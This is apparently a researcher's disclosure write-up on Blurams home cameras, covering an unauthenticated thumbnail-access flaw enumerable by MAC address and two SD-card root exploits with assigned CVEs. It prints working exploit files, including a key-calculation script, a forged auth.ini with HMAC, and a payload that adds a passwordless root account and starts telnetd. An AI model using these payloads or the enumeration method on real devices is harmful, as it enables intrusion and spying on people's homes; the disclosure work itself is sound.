[![](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-13.57.59-1024x395.png)](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-13.57.59.png)

The camera paired to our primary account appears in it already. The video can be viewed live and if enabled (by default it is not) also the cloud stored video can be viewed.

[![](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-14.02.52-1024x755.png)](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-14.02.52.png)

Most of the communication uses REST style endpoints, for example here a list of all paired devices is loaded by the web client:

[![](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-14.23.01-1024x627.png)](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-14.23.01.png)

Included in this response is the device ID of our camera: `xxxxS_a0ff22435471`

`xxxxS_` appears to be a static prefix and `a0ff22435471` is simply the MAC address of the device.

Once a live view of the stream is started, a WebSocket connection is initiated like this:

[![](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-14.29.22-1024x278.png)](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-14.29.22.png)

Through the WebSocket connection the client then sends the following request:

[![](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-14.31.48-1024x325.png)](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-14.31.48.png)

The payload of the request is Base64 encoded but in a strange way. The first 10 characters are separately encoded, in this case resulting in `1424276`. The remainder is a single encoded block of JSON data which is being cut in the middle and reversed, resulting in this:

```

":"720p","deviceName":"","clientId":"WEBCLIENT_H5_80424545391278391689940921836",
"shareId":"","relayServer":"10.150.2.147:50921","isSDCardPlayback":"false",
"preConnect":"false","releaseVersion":"","isSupportWASM":"1"}{"requestTime":
"1689940921836","productKey":"1cad3c83-d87","deviceId":"xxxxS_a0ff22435471",
"channelNo":"","token":"a4ef7ff88eb845fe99826d78922a3a8e","hasAudio":"true",
"region":"","isPermanentStorage":"false","channel

```

Changing the token in this request to the token of another user did not allow them to view the video stream, the backend handled this correctly. Also requesting cloud stored videos worked in a similar way, although not via WebSocket, the same `_paramStr_` format is used to retrieve that data, the token is also checked correctly in that instance.

Looking back at the initial view of the devices paired with the account it can be identified that the preview image is not retrieved in the same way. For example, the preview is fetched like this:

[![](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-14.52.54-1024x310.png)](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-14.52.54.png)

The URL parameters after the token can be ignored as they appear to be without any function. Simply accessing the following URL would load the preview image: `https://vrs-pho-oci.blurams.com/lookup/thumbnail/xxxxS_a0ff22435471/current?token=a4ef7ff88eb845fe99826d78922a3a8e`

The URL contains practically two parameters, the device ID and the users access token. To verify if permissions are checked here, the token was replaced with the token of a secondary user which did not have any device paired. Surprisingly the preview image could be retrieved:

[![](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-14.58.25-1024x306.png)](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-14.58.25.png)

The camera device appears to upload a preview image around every 13 seconds with a low image resolution of 640×360. Since the device ID consists only of the MAC address, it is trivial to enumerate other IDs and gain access to their (almost-) live preview images. For this the camera only needs to be paired to an account and be able to reach the cloud servers. Even if it is installed behind a firewall and incoming connections to it are blocked, as long as it can upload the images, they can be accessed by anyone.

**Using this, it is possible to get a semi-live low quality video stream of all currently online cameras.**

Curiously, there is also an endpoint which is used to get settings of the device, the request is done like this:

[![](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-15.21.02-1024x587.png)](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-15.21.02.png)

If the provided device ID is paired to the account, this request is performed instantly. However, when the account has no devices paired or if simply the device ID parameter is removed, then the request takes more than 10 seconds and returns the data of a single random device, for example:

[![](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-15.24.51-1024x586.png)](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-15.24.51.png)

Thankfully with that it is not possible to correlate the device ID with the connected SSID as far as I can tell. The response does not include it. Having the SSID would make locating the physical location of the device much easier.

# Getting shell access to the camera

In order to better understand what the camera performs, access to the Linux operating system would be preferred.

Through the endpoint `/api/device/checkMultiCameraV2` the address of a firmware image could be identified (e.g. https://fw.blurams.com/Device/1cad3c83-d87/A31C\_AK\_IPC/1/23.0406.435.4120/a31c\_f1r03\_LV230525.12237\_ota.enc), however the image is encrypted.

Having no other means of connecting to the camera the hardware was the next step to be investigated.

While the board does contain UART pins it was not possible to transmit any data to it. From them only the U-Boot boot loader messages could be read but it wasn’t immediately possible to force single user mode.

[![](https://infosec.rm-it.de/wp-content/uploads/2023/10/blog1-1024x777.jpg)](https://infosec.rm-it.de/wp-content/uploads/2023/10/blog1.jpg)

Instead to gain initial access to the firmware the flash of the camera was desoldered and dumped.

[![](https://infosec.rm-it.de/wp-content/uploads/2023/10/blog2.jpg)](https://infosec.rm-it.de/wp-content/uploads/2023/10/blog2.jpg)

This worked flawlessly and with that the binaries and configuration could be analyzed.

The file `/opt/sh/safe_exec.sh` caught our attention. This shell script is configured to be executed on startup by the following code block in `/init.d/rcS`:

```

    echo "check factorytest..."
    if [ -d /mnt/sdcard/factorytest ]; then
        echo "start factorytest..."
        cd /mnt/sdcard/factorytest
        /opt/sh/safe_exec.sh ./auth.ini ./factorytest.sh
        exit 0
    fi

```

The script is as follows:

```

#########################################################

    exit 0
}

echo "SCRIPT_MD5SUM=${SCRIPT_MD5SUM}"

# check md5sum of script and other files
AUTH_DIR=`dirname ${AUTH_FILE}`
cd ${AUTH_DIR}
MD5SUM_MD5SUM=`md5sum "${MD5SUM_FILE}" | cut -d' ' -f1`
[ x"${MD5SUM_MD5}" = x"${MD5SUM_MD5SUM}" ] || exit_with_msg 4 "md5sum file has been changed!"

md5sum -c "${MD5SUM_FILE}" || exit_with_msg 6 "check md5sum failed!"
cd -

echo "check auth ok!"
echo "run ${SCRIPT_FILE} ..." > /dev/null
sh ${SCRIPT_FILE}

```

Interesting in this script is the `check_emergy_key()` function. If this function returns true, then the shell script passed through `$2` will get executed (line 45). The `check_emergy_key()` really only takes version numbers from a file and does some calculations on it. The version of our camera can be easily identified, the endpoint `/api/device/checkMultiCameraV2` provides this information.

We can do the same calculations quickly with this shell script:

```

#!/bin/sh
VERSION='23.0406.435.4120'
P1=`echo $VERSION | cut -d'.' -f1`
P2=`echo $VERSION | cut -d'.' -f2`
P3=`echo $VERSION | cut -d'.' -f3`
AUTH1=`expr ${P1} \* 600 + ${P2} \* 30 + ${P3} \* 9`
AUTH2=`expr ${AUTH1} \* ${AUTH1}`
echo $AUTH2

```

With that configured version, this generates the “key” with the value `893711025`. Armed with that information, the folder `/factorytest` is created on an otherwise empty FAT32 formatted SD card. In that the following `auth.ini` file is placed:

```

KEY=893711025

```

And the following `factorytest.sh` file:

```

#!/bin/sh

echo 'toor:x:0:0:root:/:/bin/sh' >> /etc/passwd
echo 'toor::15874:0:99999:7:::' >> /etc/shadow

telnetd &

```

The supplied shell script will basically create a secondary root account named `toor` without a password and start `telnetd`. Putting that SD card into the camera and rebooting it gives us our root-shell via telnet:

[![](https://infosec.rm-it.de/wp-content/uploads/2023/10/Screenshot-2023-10-31-at-13.51.50.png)](https://infosec.rm-it.de/wp-content/uploads/2023/10/Screenshot-2023-10-31-at-13.51.50.png)

Using this access it was then possible to also decrypt the initially identified firmware update file via the main binary of the camera.

[![](https://infosec.rm-it.de/wp-content/uploads/2023/10/Screenshot-2023-10-31-at-15.14.41.png)](https://infosec.rm-it.de/wp-content/uploads/2023/10/Screenshot-2023-10-31-at-15.14.41.png)

Of course for our research this data is not necessary anymore. With shell access we have access to it anyway.

# Getting shell access to the camera on version 2.3.38.12558

After disclosing the SD card vulnerability to Blurams, they rolled out a new version and asked if we could take a look at the fix as well. Curious to how it was solved we started to investigate again. Using the API the URL to the firmware could be retrieved again (https://fw.blurams.com/Device/1cad3c83-d87/A31C\_AK\_IPC/2/2.3.38.12558/a31c\_f1r03\_LV231215.12558\_ota.enc), this was again an encrypted file.

Since we still had access to the device, we could decrypt this file on the camera. After decrypting and unpacking the files, we can see the new `safe_exec.sh` script:

```

#########################################################
#
#  auth.ini example:
#
#       KEY=12345678901234567
#       MD5SUM_FILE=test.md5sum
#       MD5SUM_MD5=b757a9fc7aa080272c37902c701e2eb4
#

THISDIR=`dirname $0`
AUTH_FILE=$1
SCRIPT_FILE=$2

exit_with_msg()
{
        echo "$2"
        exit $1
}

check_auth()
{
        [ x"$1" = x"" ] && return 1
        [ -f "$1" ] || return 1
        ${THISDIR}/../bin/ukeyHmacRead -t "$1" > /dev/null 2>&1
}

# check_emergy_key()

#     P3=`cut -d'.' -f3 /etc/version`
#     AUTH1=`expr ${P1} \* 600 + ${P2} \* 30 + ${P3} \* 9`
#     AUTH2=`expr ${AUTH1} \* ${AUTH1}`
#     test ${AUTH2} = ${KEY}
# }

[ x"${AUTH_FILE}" = x"" ] && exit_with_msg 1 "no auth file"
[ x"${SCRIPT_FILE}" = x"" ] && exit_with_msg 1 "no scrip file"

# check_emergy_key "${AUTH_FILE}" && {
#     echo "fast run ${SCRIPT_FILE} ..."
#     sh ${SCRIPT_FILE}
#     exit 0
# }

check_auth "${AUTH_FILE}" || exit_with_msg 2 "auth file has been changed!"

source "${AUTH_FILE}"
[ x"${MD5SUM_FILE}" = x"" ] && exit_with_msg 3 "no md5sum file"

[...]

```

We can see that the vulnerable `check_emergy_key()` function has been commented out, and instead a new binary was included in the firmware: `ukeyHmacRead`

The `auth.ini` file path is passed as an parameter to `ukeyHmacRead` to perform some check. If this does not fail, then `source "/mnt/sdcard/factorytest/auth.ini"` is executed. Since we control the content of `auth.ini` this will provide us code execution. We only need to make sure that the `ukeyHmacRead -t "/mnt/sdcard/factorytest/auth.ini"` command does not fail.

We copied the new binary to the device and later started to emulate it using `qemu` trying to figure out what it does. It appears that it calculates and checks an HMAC inside of the file. By analyzing the binary, it’s clear that it now expects `KHMAC` inside the `auth.ini` file.

After figuring out that the key needs to be at the end of the file, and needs to contain at least a certain amount of data, the tool could be used to also calculate the key of the file.

[![](https://infosec.rm-it.de/wp-content/uploads/2023/12/Screenshot-2023-12-18-at-17.37.47-1024x140.png)](https://infosec.rm-it.de/wp-content/uploads/2023/12/Screenshot-2023-12-18-at-17.37.47.png)

Using this, a new `auth.ini` file can be created to exploit the new firmware to gain a root shell on the device. On an SD card the file `/factorytest/exploit.sh` is placed with the following content:

```

#!/bin/sh

echo 'toor:x:0:0:root:/:/bin/sh' >> /etc/passwd
echo 'toor::15874:0:99999:7:::' >> /etc/shadow

telnetd &

```

And the file `/factorytest/auth.ini` is placed on it with this content:

```

KEY=12345
/mnt/sdcard/factorytest/exploit.sh
KHMAC=6213ddd1e497593bfe4f2cb25af5e47eaaef69196d45c22678e06cbde54cff84

```

Armed with this knowledge, the device was updated to the latest firmware version. After that the SD card was inserted and the device rebooted, a few seconds later the exploit executed and telnet was available again.

[![](https://infosec.rm-it.de/wp-content/uploads/2023/12/Screenshot-2023-12-18-at-17.57.11.png)](https://infosec.rm-it.de/wp-content/uploads/2023/12/Screenshot-2023-12-18-at-17.57.11.png)

Having access to the device and being able to decrypt the firmware update file allowed us to very quickly gain access to the `ukeyHmacRead` binary. It should be noted that without this access, an attacker could again desolder and dump the memory of the flash to access the files. Using this short-cut just saved us a lot of time.

# Vulnerabilities

This is the condensed list of vulnerabilities identified during this research in order of appearance. At the time of publishing this article, all of the vulnerabilities have been fixed.

## 1. Unauthorised access to camera feed thumbnails

The cameras upload a lower resolution thumbnail (usually 640×360) every roughly 13 seconds. These thumbnails can be accessed by providing any valid access token, it is not verified if the access token is from an account paired with the camera. Creating an account go get a token is free and does not require the purchase of a camera.

The camera ID required to access cameras is based on the mac address of the device and can therefore be trivially enumerated.

With that it was possible for anyone to access any camera thumbnail image of any camera that was currently online.

## 2. Code execution through SD card (CVE-2023-50488)

By abusing a factory test script on the device it is possible to execute any command on the device as the root user.

A key which should protect this function is based only on the software version string of the device. These version strings are generally publicly known. The key can therefore be calculated and this factory test function can be abused to get code execution on the device.

Placing two files on an SD card, inserting this SD card into the device and rebooting the device will execute a attacker provided shell script with root privileges on it (see examples on [GitHub](https://github.com/roman-mueller/PoC/tree/master/CVE-2023-50488)). This potentially affects all devices up to and including firmware version 23.0406.435.4120.

## 3. Code execution through SD card (CVE-2023-51820)

Again abusing a factory test script on the device it is possible to execute any command on the device as the root user.

The key has been moved from being calculated based on the version string, to a static key inside a binary. If the key is once obtained, then a file can be forged that allows code execution on all devices running this firmware version.

Placing two files on an SD card, inserting this SD card into the device and rebooting the device will execute a attacker provided shell script with root privileges on it (see examples on [GitHub](https://github.com/roman-mueller/PoC/tree/master/CVE-2023-51820)). This only affects devices with firmware version 2.3.38.12558 installed.

# Conclusion

Due to time issues, this is as far as our investigation goes. Ultimately we were unable to access the HD video stream, access was only possible to the semi-live preview images of the video streams.

Overall we were surprised by the sophistication of the device which is relatively cheap. Communication is for the most parts encrypted, no services are exposed via network, an update mechanism appears to exist, and using UART it was not trivially possible to boot into single user mode.

We hope that this ground-work enables other researches to further investigate the devices. We haven’t even started to look at the mobile Apps or the main camera binary.

Working with Blurams, once a communication channel was established, has been great. They were interested in fixing the reported vulnerabilities, asked us to check their remediations and took our recommendations.
